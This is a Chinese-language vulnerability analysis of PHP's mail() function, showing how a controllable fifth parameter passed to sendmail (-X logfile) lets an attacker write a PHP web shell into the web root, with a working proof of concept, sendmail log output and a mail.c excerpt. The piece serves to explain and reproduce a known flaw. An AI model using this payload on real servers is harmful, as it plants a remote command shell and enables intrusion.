php manual 手册上的介绍

	bool mail ( string $to , string $subject , string $message [, mixed $additional_headers [, string $additional_parameters ]] )

```
To 目的邮箱地址
Subject 邮箱的主题
Message 邮件的主题部分
Headers 头信息
Parameters 参数设置
```

```
<?php
$to      = 'nobody@example.com';
$subject = 'the subject';
$message = 'hello';
$headers = 'From: webmaster@example.com' . "\r\n" .
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);
?>
```

PHP中的mail()函数在一定的条件下可以造成远程代码执行漏洞，mail()函数一共具有5个参数，当第五个参数存在并且我们可控的时候，就会造成代码执行漏洞，这个漏洞最近被RIPS爆出了一个command execution via email in Roundcube 1.2.2，就是由于不正当的使用了mail()函数并且未对参数加以过滤造成的。



这个参数主要的选项有：
```
-O option = value
QueueDirectory = queuedir 选择队列消息

-X logfile
这个参数可以指定一个目录来记录发送邮件时的详细日志情况，我们正式利用这个参数来达到我们的目的。

-f from email
这个参数可以让我们指定我们发送邮件的邮箱地址。
```

现在我们尝试在本地复现出这个漏洞，注意事项：

```
目标系统必须使用函数mail发送邮件，而不是使用SMTP的服务器；
mail函数需要配置实用sendmail系统来进行邮件的发送；
PHP配置中必须关闭safe_mode功能；
必须知道目标服务器的Web根目录
```

test.php

```
$to = 'a@b.c';
$subject = '<?php system($_GET["cmd"]); ?>';
$message = '';
$headers = '';
$options = '-OQueueDirectory=/tmp -X/var/www/html/rce.php';
mail($to, $subject, $message, $headers, $options);
```

运行即可再/var/www/html/目录下生成rce.php文件，内容为:

```
32512 <<< To: a@b.c
32512 <<< Subject: <?php system($_GET["cmd"]); ?>
32512 <<< X-PHP-Originating-Script: 0:mail.php
32512 <<< 
32512 <<< 
32512 <<< [EOF]
32512 === CONNECT [127.0.0.1]
32512 <<< 220 lj ESMTP Sendmail 8.15.2/8.15.2/Debian-3; Sun, 30 Sep 2018 16:32:30 +0800; (No UCE/UBE) logging access from: localhost(OK)-localhost [127.0.0.1]
32512 >>> EHLO lj
32512 <<< 250-lj Hello localhost [127.0.0.1], pleased to meet you
32512 <<< 250-ENHANCEDSTATUSCODES
32512 <<< 250-PIPELINING
32512 <<< 250-EXPN
32512 <<< 250-VERB
32512 <<< 250-8BITMIME
32512 <<< 250-SIZE
32512 <<< 250-DSN
32512 <<< 250-ETRN
32512 <<< 250-AUTH DIGEST-MD5 CRAM-MD5
32512 <<< 250-DELIVERBY
32512 <<< 250 HELP
32512 >>> MAIL From:<root@lj> SIZE=89 AUTH=root@lj
32512 <<< 250 2.1.0 <root@lj>... Sender ok
32512 >>> RCPT To:<a@b.c>
32512 >>> DATA
32512 <<< 250 2.1.5 <a@b.c>... Recipient ok
32512 <<< 354 Enter mail, end with "." on a line by itself
32512 >>> Received: (from root@localhost)
32512 >>> 	by lj (8.15.2/8.15.2/Submit) id w8U8WToP032512;
32512 >>> 	Sun, 30 Sep 2018 16:32:29 +0800
32512 >>> Date: Sun, 30 Sep 2018 16:32:29 +0800
32512 >>> From: root <root@lj>
32512 >>> Message-Id: <201809300832.w8U8WToP032512@lj>
32512 >>> To: a@b.c
32512 >>> Subject: <?php system($_GET["cmd"]); ?>
32512 >>> X-PHP-Originating-Script: 0:mail.php
32512 >>> 
32512 >>> 
32512 >>> .
32512 <<< 250 2.0.0 w8U8WUsh032770 Message accepted for delivery
32512 >>> QUIT
32512 <<< 221 2.0.0 lj closing connection
```

我们指定好使用mail函数时的五个参数，在第二个参数中放入我们打算写入的内容，第五个参数中指定我们要写入的目录（必须是PHP文件）

截取片段mail.c的源码
```
PHPAPI int php_mail(char *to, char *subject, char *message, char *headers, char *extra_cmd TSRMLS_DC)
{
#if (defined PHP_WIN32 || defined NETWARE)
	int tsm_err;
	char *tsm_errmsg = NULL;
#endif
	FILE *sendmail;
	int ret;
	char *sendmail_path = INI_STR("sendmail_path");
	char *sendmail_cmd = NULL;
	char *mail_log = INI_STR("mail.log");
	char *hdr = headers;
#if PHP_SIGCHILD
	void (*sig_handler)() = NULL;
#endif

...

	if (extra_cmd != NULL) {
		spprintf(&sendmail_cmd, 0, "%s %s", sendmail_path, extra_cmd);
	} else {
		sendmail_cmd = sendmail_path;
	}

...

#ifdef PHP_WIN32
	sendmail = popen_ex(sendmail_cmd, "wb", NULL, NULL TSRMLS_CC);
#else
	/* Since popen() doesn't indicate if the internal fork() doesn't work
	 * (e.g. the shell can't be executed) we explicitly set it to 0 to be
	 * sure we don't catch any older errno value. */
	errno = 0;
	sendmail = popen(sendmail_cmd, "w");
#endif
	if (extra_cmd != NULL) {
		efree (sendmail_cmd);
	}
```

我们可以看到mail函数的底层实际上是调用sendmail 函数来执行命令的。


PHPMailer < 5.2.18和Roundcube 两个应用都爆出来过mail函数导致的命令执行漏洞。

Roundcube 1.2.2 远程命令执行漏洞分析 https://paper.seebug.org/138/